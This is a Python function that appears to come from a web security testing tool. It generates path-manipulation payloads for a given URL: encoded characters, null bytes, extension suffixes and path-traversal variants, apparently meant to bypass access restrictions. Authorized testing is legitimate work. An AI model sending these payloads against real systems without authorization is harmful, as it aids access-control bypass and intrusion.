from urllib.parse import urlsplit


def build_paths(url):
    path = urlsplit(url).path
    segments = [s for s in path.split("/") if s]
    endpoint = segments[-1] if segments else None

    path_payloads = {
        "normal": ["/", "//", "///", "\\/", "/./", "/.", "/.../", "/;/", "/;foo=bar",
                   "/anything//{endpoint}", "/anything///{endpoint}", "/{endpoint}/.",
                   "/?", "/??", "/~", "#", "/%2e", "/%2f", "/%20", "/%09", "/%23",
                   "/%3f", "/%3b", "/%3a", "/%25", "/%5c", "%00anything"],

        "extension": ["/.php", ".txt", ".html", ".ico", ".svg", ".htMl"],

        "traversal_1": ["/../{endpoint}", "/..\\/{endpoint}", "/..%5c{endpoint}", "/..%2f{endpoint}",
                        "/..;/{endpoint}", "/%2e%2e/{endpoint}", "/%252e%252e/{endpoint}",
                        "/anything/../{endpoint}", "/anything/..\\/{endpoint}", "/{endpoint}/..", "/anything/../../{endpoint}"],

        "traversal_2": ["/../../{endpoint}", "/..\\../{endpoint}", "/..%5c..%2f{endpoint}",
                        "/%2e%2e%2f%2e%2e/{endpoint}", "/%252e%252e%252f%252e%252e/{endpoint}",]}

    traversal_depth = {"traversal_1": 1, "traversal_2": 2}
    payloads = []

    for category, values in path_payloads.items():
        if category == "extension" and not endpoint:
            continue

        depth = traversal_depth.get(category)

        if depth is not None:
            if not segments:
                continue

            down_segments = segments[-depth:] if len(segments) >= depth else segments
            down = "/".join(down_segments)
        else:
            down = endpoint

        for payload in values:
            if "{endpoint}" in payload:
                if down is None:
                    continue
                payload = payload.replace("{endpoint}", down)

            payloads.append(url + payload)

    return {"techniques": "Path Manipulation", "payload": payloads, "location": "url",}